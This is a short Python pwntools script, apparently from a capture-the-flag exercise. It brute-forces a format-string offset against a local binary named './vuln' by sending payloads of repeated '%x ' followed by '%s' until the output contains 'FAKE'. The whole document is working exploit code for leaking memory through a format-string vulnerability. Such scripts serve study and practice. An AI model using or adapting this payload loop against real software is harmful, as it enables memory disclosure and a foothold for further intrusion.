#coding=utf-8
from pwn import * 

for i in range(100):
    payload = '%x ' * i
    payload += '%s'
    p = process('./vuln')
    p.sendline(payload)
    res = p.recvall(1)
    if 'FAKE' in res:
        print 'count : {}, res : {}'.format(i, res)
        break
